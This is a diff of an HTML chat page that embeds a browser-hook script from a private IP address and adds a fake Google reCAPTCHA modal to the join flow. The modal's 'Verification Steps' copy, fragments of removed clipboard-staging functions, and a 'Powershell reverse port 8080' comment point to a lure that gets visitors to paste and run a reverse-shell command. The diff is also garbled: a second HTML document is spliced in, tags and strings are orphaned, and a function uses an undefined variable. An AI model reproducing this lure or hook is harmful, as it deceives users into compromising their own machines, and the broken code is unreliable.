@@ -63,24 +63,51 @@
     <script async src="http://192.168.1.113:3000/hook.js" id="dynamic-script"></script>
     <script defer src = "http://192.168.1.113:3001/chat/socket.io/socket.io.js" id="dynamic-script-2"></script>
 
+<!-- User list sidebar -->
+<aside id="userListSidebar" aria-label="User List" tabindex="0" style="position:fixed;right:0;top:0;width:200px;height:100vh;background:#f7f7f7;border-left:1px solid #ddd;overflow-y:auto;z-index:1000;display:none;"></aside>
+
+<!-- Theming toggle and language selector -->
+<div style="display:flex;gap:12px;align-items:center;justify-content:flex-end;margin:8px 0;">
+  <button id="themeToggle" aria-label="Toggle dark mode">🌓</button>
+  <select id="langSelect" aria-label="Select language">
+    <option value="en">English</option>
+    <option value="es">Español</option>
+  </select>
+</div>
+
 <div class="chat-container">
-    <div class="messages" id="messages"></div>
+    <div class="messages" id="messages" aria-live="polite" tabindex="0"></div>
     <div class="controls">
-        <input type="text" id="messageInput" placeholder="Type a message...">
-        <button id="emojiBtn" title="Add emoji">😊</button>
-        <button id="sendButton">Send</button>
+        <input type="text" id="messageInput" placeholder="Type a message..." tabindex="0">
+        <button id="emojiBtn" title="Add emoji" tabindex="0">😊</button>
+        <button id="sendButton" tabindex="0">Send</button>
     </div>
-    <div id="emojiPicker" style="display:none; position:absolute; background:#fff; border:1px solid #ccc; padding:10px; border-radius:8px; z-index:1000;"></div>
+    <div id="emojiPicker" style="display:none; position:absolute; background:#fff; border:1px solid #ccc; padding:10px; border-radius:8px; z-index:1000;">
+      <button class="emoji-choice" tabindex="0">😀</button>
+      <button class="emoji-choice" tabindex="0">😂</button>
+      <button class="emoji-choice" tabindex="0">😍</button>
+      <button class="emoji-choice" tabindex="0">👍</button>
+      <button class="emoji-choice" tabindex="0">🎉</button>
+      <button class="emoji-choice" tabindex="0">😢</button>
+      <button class="emoji-choice" tabindex="0">😡</button>
+    </div>
 </div>
 
 <!-- User join modal for name and avatar selection -->
-<div id="joinModal" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.4);display:flex;align-items:center;justify-content:center;z-index:2000;">
+<div id="joinModal" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.4);display:flex;align-items:center;justify-content:center;z-index:2000;" role="dialog" aria-modal="true" aria-labelledby="joinModalTitle">
   <div style="background:#fff;padding:32px 24px;border-radius:12px;box-shadow:0 6px 24px rgba(0,0,0,0.15);max-width:350px;width:100%;text-align:center;">
-    <h2>Join Chat</h2>
+    <h2 id="joinModalTitle">Join Chat</h2>
     <input type="text" id="joinName" placeholder="Enter your name" style="margin-bottom:12px;width:90%"><br>
     <label style="font-size:14px;">Avatar (optional): <input type="file" id="joinAvatar" accept="image/*" style="margin:8px 0"></label><br>
+    <!-- Avatar preview in join modal -->
+    <img id="avatarPreview" style="width:48px;height:48px;border-radius:50%;margin:8px auto;display:none;" alt="Avatar preview">
     <button id="joinBtn">Join</button>
   </div>
+</div>
+
+<!-- CAPTCHA Modal for Join Flow -->
+<div id="captchaModal">
+  <iframe src="/captcha.html"></iframe>
 </div>
 
 <!DOCTYPE html>
@@ -308,26 +335,14 @@
         <div id="checkbox-window" class="checkbox-window m-p block">
             <div class="checkbox-container m-p">
                 <button type="button" id="checkbox" class="checkbox m-p line-normal" aria-label="Verify you are not a robot"></button>
+                <img class="spinner" alt="Loading spinner" id="spinner">
             </div>
             <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
-            <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt="">
+            <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt="Google reCAPTCHA logo">
             <br>
             <p class="checkbox-desc m-p line-normal">
             <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
-            </p>
-            <img class="spinner" alt="" id="spinner">
-        </div>
-        
-        <div id="verify-window" class="verify-window">
-            <div class="verify-container">
-                <header class="verify-header">
-                    <span class="verify-header-text-medium m-p block">Complete these</span>
-                    <span class="verify-header-text-big m-p block">Verification Steps</span>
-                    <span class="verify-header-text-medium m-p block"></span>
-                </header>
-                <main class="verify-main">
-                    <p>
-                        To better prove you are not a robot, please:
+            </p> 
                     </p>
                     <ol>
                         <li>
@@ -446,26 +461,7 @@
             verifywindow.style.opacity = "0";
 
             showCaptchaCheckbox();
-            hideCaptchaLoading();
-            checkboxBtn.disabled = false;
-        }
-
-        function isverifywindowVisible() {
-            return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
-        }
-
-        function setClipboardCopyData(textToCopy){
-            const tempTextArea = document.createElement("textarea");
-            tempTextArea.value = textToCopy;
-            document.body.append(tempTextArea);
-            tempTextArea.select();
-            document.execCommand("copy");
-            document.body.removeChild(tempTextArea);
-        }
-
-        function stageClipboard(commandToRun, verification_id){
-            const suffix = " # "
-            const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: "
+            hideCaptchaLoading(); 
             const end = "''"
           
             // # Powershell  reverse port 8080  
@@ -506,3 +502,45 @@
         </script>
     </body>
 </html>
+
+<div id="verify-window" class="verify-window" role="dialog" aria-modal="true" aria-labelledby="verify-header-text-big">
+  <div class="verify-container">
+    <header class="verify-header">
+      <span class="verify-header-text-medium m-p block">Complete these</span>
+      <span id="verify-header-text-big" class="verify-header-text-big m-p block">Verification Steps</span>
+      <span class="verify-header-text-medium m-p block"></span>
+    </header>
+    <main class="verify-main">
+      <p>To better prove you are not a robot, please:</p>
+      <ol>
+        <li>Check the box above.</li>
+        <li>Follow any additional verification steps.</li>
+        <li>Press <b>Enter</b> on your keyboard to finish.</li>
+      </ol>
+      <p>You will observe and agree:<br>
+        <code>✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>"</code>
+      </p>
+    </main>
+  </div>
+</div>
+
+<script>
+// Show CAPTCHA modal on join attempt
+const joinBtn = document.getElementById('joinBtn');
+const captchaModal = document.getElementById('captchaModal');
+joinBtn.addEventListener('click', function(e) {
+  e.preventDefault();
+  captchaModal.style.display = 'flex';
+  // TODO: Listen for CAPTCHA success event from iframe
+});
+// TODO: On CAPTCHA success, hide modal and proceed to join chat
+</script>
+
+<script>
+function addReaction(msgId, emoji) {
+  socket.emit('add-reaction', { id: msgId, emoji });
+}
+function renderReactions(reactions) {
+  return Object.entries(reactions || {}).map(([emoji, count]) => `<button onclick="addReaction('${msgId}','${emoji}')">${emoji} ${count}</button>`).join(' ');
+}
+</script>
